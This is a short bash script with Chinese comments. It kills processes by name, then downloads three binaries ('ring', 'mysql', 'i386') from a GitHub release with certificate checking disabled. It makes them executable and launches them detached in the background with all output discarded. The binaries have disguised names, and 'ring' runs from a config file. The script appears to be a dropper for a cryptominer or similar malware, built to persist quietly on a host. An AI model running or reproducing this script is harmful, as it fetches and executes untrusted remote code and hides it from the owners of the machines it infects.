#!/bin/bash

# 首先终止匹配的进程
pkill -9 -f './mnt/ring/ring'
pkill -9 -f './mysql'
pkill -9 -f './i386'

# 检查/mnt/ring目录是否存在，如果存在则跳过，如果不存在则执行
if [ ! -d "/mnt/ring" ]; then
  cd /mnt
  wget https://github.com/mumu1667/trx20/releases/download/fuck/ring.tar
  tar -xvf /mnt/ring.tar
  chmod +x /mnt/ring/ring
fi

# 检查/opt目录下mysql文件是否存在，如果存在则跳过，如果不存在则执行
if [ ! -f "/opt/mysql" ]; then
  cd /opt
  wget -qO mysql --no-check-certificate https://github.com/mumu1667/trx20/releases/download/fuck/mysql
  chmod +x mysql
  ./mysql & disown
fi

# 检查/opt目录下i386文件是否存在，如果存在则跳过，如果不存在则执行
if [ ! -f "/opt/i386" ]; then
  cd /opt
  wget -qO i386 --no-check-certificate https://github.com/mumu1667/trx20/releases/download/fuck/i386
  chmod +x i386
  nohup ./i386 >/dev/null 2>&1 & disown
fi

# 启动新的进程并将其放入后台运行，同时将标准输出和错误输出重定向到/dev/null
/mnt/ring/ring -c /mnt/ring/config.json >/dev/null 2>&1 & disown
cd /opt; ./mysql >/dev/null 2>&1 & disown
cd /opt; ./i386 >/dev/null 2>&1 & disown
